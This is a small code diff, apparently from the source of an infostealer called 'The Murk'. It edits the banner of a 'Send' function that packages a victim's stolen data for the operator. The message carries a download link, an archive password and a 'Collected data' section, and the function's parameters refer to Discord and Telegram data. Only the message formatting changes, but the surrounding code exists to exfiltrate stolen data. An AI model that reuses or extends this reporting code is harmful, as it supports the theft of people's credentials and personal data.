@@ -42,9 +42,9 @@ def Send(type,np,data,dataB,dataO,dataW,dataF,dataV,discordData,TelegramData,xmp
 		message = ''
 		try:
 			if type == 0:
-				title = f"▀▀█▀▀ █──█ █▀▀ 　 ░█▀▄▀█ █──█ █▀▀█ █─█ 　 █▀▀█ █▀▀ █▀▀ █──█ █── ▀▀█▀▀ █▀▀\n─░█── █▀▀█ █▀▀ 　 ░█░█░█ █──█ █▄▄▀ █▀▄ 　 █▄▄▀ █▀▀ ▀▀█ █──█ █── ──█── ▀▀█\n─░█── ▀──▀ ▀▀▀ 　 ░█──░█ ─▀▀▀ ▀─▀▀ ▀─▀ 　 ▀─▀▀ ▀▀▀ ▀▀▀ ─▀▀▀ ▀▀▀ ──▀── ▀▀▀\n[Link🔗]({url})\nPassword: ||{np[1]}||\n\n<b>⇓Collected data⇓</b>"
+				title = f"**:regional_indicator_t: :regional_indicator_h: :regional_indicator_e:  :regional_indicator_m: :regional_indicator_u: :regional_indicator_r: :regional_indicator_k:  :regional_indicator_r: :regional_indicator_e: :regional_indicator_s: :regional_indicator_u: :regional_indicator_l: :regional_indicator_t: :regional_indicator_s: **\n\n[🔗Link]({url})\n📜Password: ||{np[1]}||\n\n**⇓Collected data⇓**"
 			if type == 1 or type == 2:
-				title = f"▀▀█▀▀ █──█ █▀▀ 　 ░█▀▄▀█ █──█ █▀▀█ █─█\n─░█── █▀▀█ █▀▀ 　 ░█░█░█ █──█ █▄▄▀ █▀▄ \n─░█── ▀──▀ ▀▀▀ 　 ░█──░█ ─▀▀▀ ▀─▀▀ ▀─▀\nLink🔗:{url}\nPassword: {np[1]}\n\n<b>⇓Collected data⇓</b>"			
+				title = f"<b>🛑hey bro, see The Murk results🛑</b>\n🔗Link:{url}\n📜Password: {np[1]}\n\n<b>⇓Collected data⇓</b>"			
 			message += f"{title}"
 			try:
 				message += data
